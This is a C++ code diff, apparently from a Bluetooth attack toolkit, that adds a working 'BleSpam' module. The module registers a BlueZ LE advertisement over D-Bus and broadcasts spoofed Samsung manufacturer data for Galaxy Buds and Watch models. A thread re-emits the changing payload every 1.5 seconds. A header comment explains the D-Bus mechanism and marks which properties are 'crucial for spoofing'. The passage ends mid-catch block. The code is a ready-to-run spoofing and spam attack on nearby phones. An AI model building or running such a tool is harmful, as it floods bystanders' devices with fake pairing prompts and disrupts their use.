@@ -1,13 +1,60 @@
+/*
+ * ======================================================================================
+ * REFERENCE - BLUEZ LE ADVERTISING MECHANISM
+ * ======================================================================================
+ * * How BlueZ Advertising Works (The "Inversion of Control"):
+ * --------------------------------------------------------------------------------------
+ * Unlike traditional APIs where you push data TO the system, BlueZ acts as a Client
+ * and your application acts as a Server (D-Bus Object).
+ * * 1. REGISTRATION: You tell BlueZ "I have an object at path '/org/btmagus/blespam'
+ * that implements the interface 'org.bluez.LEAdvertisement1'."
+ * (Method: RegisterAdvertisement)
+ * * 2. INTERROGATION: BlueZ immediately calls 'GetAll' on your object path to read
+ * your properties. This is where the data is actually transferred.
+ * * 3. UPDATES: To change data (e.g., rotate MAC spoofing), you don't call BlueZ.
+ * Instead, you emit a 'PropertiesChanged' signal on your object. BlueZ hears this,
+ * wakes up, and calls your 'Getter' again to fetch the new data.
+ * * --------------------------------------------------------------------------------------
+ * THE "VTABLE" (D-Bus Interface: org.bluez.LEAdvertisement1)
+ * --------------------------------------------------------------------------------------
+ * Your D-Bus object must implement these properties with specific signatures.
+ * A crash here usually means a Signature Mismatch (e.g., sending 'ay' instead of 'v').
+ * * Mandatory Properties:
+ * * Property: "Type"
+ * Type:     String ("s")
+ * Value:    "peripheral" (Connectable) or "broadcast" (Non-connectable)
+ * * Optional Properties (Crucial for spoofing):
+ * * Property: "ServiceUUIDs"
+ * Type:     Array of Strings ("as")
+ * Value:    List of 128-bit UUIDs (e.g., {"180D", "180F"})
+ * * Property: "ManufacturerData"
+ * Type:     Dictionary: Uint16 -> Variant containing Array of Bytes ("a{qv}")
+ * Details:
+ * - Key:   uint16_t (Manufacturer ID, e.g., 0x0075 for Samsung)
+ * - Value: sdbus::Variant (Must wrap std::vector<uint8_t>)
+ * * Property: "ServiceData"
+ * Type:     Dictionary: String -> Variant containing Array of Bytes ("a{sv}")
+ * Details:  Key is the Service UUID (e.g. "FE9F" for Google Fast Pair)
+ * * Property: "LocalName"
+ * Type:     String ("s")
+ * Value:    Name shown in scanner (if packet space allows)
+ * * Property: "Includes"
+ * Type:     Array of Strings ("as")
+ * Value:    {"tx-power", "appearance", "local-name"} (System auto-fills these)
+ * * ======================================================================================
+ */
+
 #include "ble_spam.h"
 
 #include <chrono>
+#include <iostream>
 #include <thread>
 #include <sdbus-c++/AdaptorInterfaces.h>
 #include <sdbus-c++/IConnection.h>
 
 #include "../core/globals.h"
 
-std::map<std::string, std::string> genuineBudsIds = {
+const std::map<std::string, std::string> genuineBudsIds = {
         {"EE7A0C", "Fallback Buds"},
         {"9D1700", "Fallback Dots"},
         {"39EA48", "Light Purple Buds2"},
@@ -31,99 +78,153 @@ std::map<std::string, std::string> genuineBudsIds = {
 };
 
 const std::map<std::string, std::string> genuineWatchIds = {
-        {"1A", "Fallback Watch"},
-        {"01", "White Watch4 Classic 44m"},
-        {"02", "Black Watch4 Classic 40m"},
-        {"03", "White Watch4 Classic 40m"},
-        {"04", "Black Watch4 44mm"},
-        {"05", "Silver Watch4 44mm"},
-        {"06", "Green Watch4 44mm"},
-        {"07", "Black Watch4 40mm"},
-        {"08", "White Watch4 40mm"},
-        {"09", "Gold Watch4 40mm"},
-        {"0A", "French Watch4"},
-        {"0B", "French Watch4 Classic"},
-        {"0C", "Fox Watch5 44mm"},
-        {"11", "Black Watch5 44mm"},
-        {"12", "Sapphire Watch5 44mm"},
-        {"13", "Purpleish Watch5 40mm"},
-        {"14", "Gold Watch5 40mm"},
-        {"15", "Black Watch5 Pro 45mm"},
-        {"16", "Gray Watch5 Pro 45mm"},
-        {"17", "White Watch5 44mm"},
-        {"18", "White & Black Watch5"},
-        {"1B", "Black Watch6 Pink 40mm"},
-        {"1C", "Gold Watch6 Gold 40mm"},
-        {"1D", "Silver Watch6 Cyan 44mm"},
-        {"1E", "Black Watch6 Classic 43m"},
-        {"20", "Green Watch6 Classic 43m"},
-    };
+        {"001A", "Fallback Watch"},
+        {"0001", "White Watch4 Classic 44m"},
+        {"0002", "Black Watch4 Classic 40m"},
+        {"0003", "White Watch4 Classic 40m"},
+        {"0004", "Black Watch4 44mm"},
+        {"0005", "Silver Watch4 44mm"},
+        {"0006", "Green Watch4 44mm"},
+        {"0007", "Black Watch4 40mm"},
+        {"0008", "White Watch4 40mm"},
+        {"0009", "Gold Watch4 40mm"},
+        {"000A", "French Watch4"},
+        {"000B", "French Watch4 Classic"},
+        {"000C", "Fox Watch5 44mm"},
+        {"0011", "Black Watch5 44mm"},
+        {"0012", "Sapphire Watch5 44mm"},
+        {"0013", "Purpleish Watch5 40mm"},
+        {"0014", "Gold Watch5 40mm"},
+        {"0015", "Black Watch5 Pro 45mm"},
+        {"0016", "Gray Watch5 Pro 45mm"},
+        {"0017", "White Watch5 44mm"},
+        {"0018", "White & Black Watch5"},
+        {"001B", "Black Watch6 Pink 40mm"},
+        {"001C", "Gold Watch6 Gold 40mm"},
+        {"001D", "Silver Watch6 Cyan 44mm"},
+        {"001E", "Black Watch6 Classic 43m"},
+        {"0020", "Green Watch6 Classic 43m"},
+};
 
 void startBleSpam(MessageDispatcher& msgDispatcher) {
     try {
-        // Create connection to bluez LEAdvertisingManager1
-        sdbus::ServiceName serviceName{"org.btmagus.blespam"};
-        auto connection = sdbus::createSystemBusConnection(serviceName);
+        auto connection = sdbus::createSystemBusConnection();
 
-        // Create my object
         sdbus::ObjectPath myAdvPath{"/org/btmagus/blespam"};
-        auto myAdvObject = sdbus::createObject(*connection, std::move(myAdvPath));
 
         sdbus::InterfaceName interfaceName{"org.bluez.LEAdvertisement1"};
 
         advertisementGenerator generator(genuineBudsIds, genuineWatchIds);
 
-        // 1. Add the VTable
-        myAdvObject->addVTable(
+        auto myAdvObject = sdbus::createObject(*connection, myAdvPath);
 
-            // METHOD: Release (Required)
+        myAdvObject->addVTable(
             sdbus::registerMethod("Release")
                  .implementedAs([](){
-                     // Do nothing. BlueZ just told us we are stopped.
-                     // Returning void automatically sends the D-Bus reply.
+                     std::cerr << "[BleSpam]: Release called by BlueZ" << std::endl;
                  }),
 
-            // PROPERTY: Type (Required)
             sdbus::registerProperty("Type")
                  .withGetter([](){ return "peripheral"; })
                  .withUpdateBehavior(sdbus::Flags::EMITS_CHANGE_SIGNAL),
 
-            // PROPERTY: ServiceUUIDs (Required)
             sdbus::registerProperty("ServiceUUIDs")
                  .withGetter([](){ return std::vector<std::string>{}; })
                  .withUpdateBehavior(sdbus::Flags::EMITS_CHANGE_SIGNAL),
 
-            // PROPERTY: ManufacturerData (Spam Payload)
-            sdbus::registerProperty("ManufacturerData")
-                 .withGetter([&generator, &msgDispatcher](){
-                     std::map<uint16_t, std::vector<uint8_t>> manufData;
+                 sdbus::registerProperty("ManufacturerData")
+                      .withGetter([&generator](){
+                          std::map<uint16_t, sdbus::Variant> manufData;
 
-                     std::vector<uint8_t> payload = generator.getGenuineWatchAdvertisement();
+                          std::vector<uint8_t> payload = generator.getGenuineWatchAdvertisement();
 
-                     manufData[0x0075] = payload;
+                          manufData[0x0075] = sdbus::Variant(payload);
 
-                     std::string payload_str(payload.begin(), payload.end());
-                     msgDispatcher.dispatchMessage(Message(Message::BleSpam,
-                         std::format("Manuf data payload: {}", payload_str)));
+                          std::string payload_str(payload.begin(), payload.end());
+                          // msgDispatcher.dispatchMessage(Message(Message::BleSpam,
+                          //     std::format("Manuf data payload size: {}", payload.size()))); // for debugging
 
-                     return manufData;
-                 })
-                 .withUpdateBehavior(sdbus::Flags::EMITS_CHANGE_SIGNAL)
+                          return manufData;
+                      })
+                      .withUpdateBehavior(sdbus::Flags::EMITS_CHANGE_SIGNAL)
 
         ).forInterface(interfaceName);
 
         auto managerProxy = sdbus::createProxy(*connection, sdbus::ServiceName{"org.bluez"},
             sdbus::ObjectPath{getAdapterObjectPath()});
 
-        managerProxy->callMethod("RegisterAdvertisement")
-                    .onInterface("org.bluez.LEAdvertisingManager1")
-                    .withArguments(myAdvPath, std::map<std::string, sdbus::Variant>{});
+        msgDispatcher.dispatchMessage(Message(Message::BleSpam, "Registering advertisement..."));
 
-        advertisementGenerator ag;
-        while (isBleSpamRunning->load()) {
-            std::this_thread::sleep_for(std::chrono::milliseconds(100));
+        std::atomic<bool> registered{false};
+        std::string registration_error;
+
+        managerProxy->callMethodAsync("RegisterAdvertisement")
+                    .onInterface("org.bluez.LEAdvertisingManager1")
+                    .withArguments(myAdvPath, std::map<std::string, sdbus::Variant>{})
+                    .uponReplyInvoke(
+                        [&registered, &registration_error, &msgDispatcher](std::optional<sdbus::Error> error) {
+                        if (error) {
+                            registration_error = error->getMessage();
+                            msgDispatcher.dispatchMessage(Message(Message::BleSpam,
+                                std::format("Registration failed: {}", registration_error)));
+                        } else {
+                            msgDispatcher.dispatchMessage(Message(Message::BleSpam, "Advertisement registered!"));
+                        }
+                        registered = true;
+                    });
+
+        // Wait for registration to complete while processing events
+        while (!registered.load() && isBleSpamRunning->load()) {
+            connection->processPendingEvent();
+            std::this_thread::sleep_for(std::chrono::milliseconds(10));
         }
-        // Stoping thread here
+
+        if (!registration_error.empty()) {
+            throw sdbus::Error(sdbus::Error::Name("Registration"), registration_error);
+        }
+
+        std::jthread pulser([&](std::stop_token const &stoken){
+            while(!stoken.stop_requested()){
+                std::this_thread::sleep_for(std::chrono::milliseconds(1500));
+                if (stoken.stop_requested()) break;
+
+                //Emitting property change signal...
+                myAdvObject->emitPropertiesChangedSignal(
+                    interfaceName,
+                    std::vector{sdbus::PropertyName{"ManufacturerData"}}
+                );
+            }
+        });
+
+        // Process events while running
+        while (isBleSpamRunning->load()) {
+            connection->processPendingEvent();
+            std::this_thread::sleep_for(std::chrono::milliseconds(10));
+        }
+
+        pulser.request_stop();
+
+        msgDispatcher.dispatchMessage(Message(Message::BleSpam, "Unregistering..."));
+
+        // Unregister also async to avoid timeout
+        std::atomic<bool> unregistered{false};
+        managerProxy->callMethodAsync("UnregisterAdvertisement")
+                    .onInterface("org.bluez.LEAdvertisingManager1")
+                    .withArguments(myAdvPath)
+                    .uponReplyInvoke([&unregistered, &msgDispatcher](std::optional<sdbus::Error> error) {
+                        if (!error) {
+                            msgDispatcher.dispatchMessage(Message(Message::BleSpam, "Unregistered successfully"));
+                        }
+                        unregistered = true;
+                    });
+
+        // Wait for unregister to complete
+        auto timeout = std::chrono::steady_clock::now() + std::chrono::seconds(2);
+        while (!unregistered.load() && std::chrono::steady_clock::now() < timeout) {
+            connection->processPendingEvent();
+            std::this_thread::sleep_for(std::chrono::milliseconds(10));
+        }
+
     }
     catch(const sdbus::Error& e) {
         Message err_msg(Message::BleSpam, "[Error - BleSpam]: ");
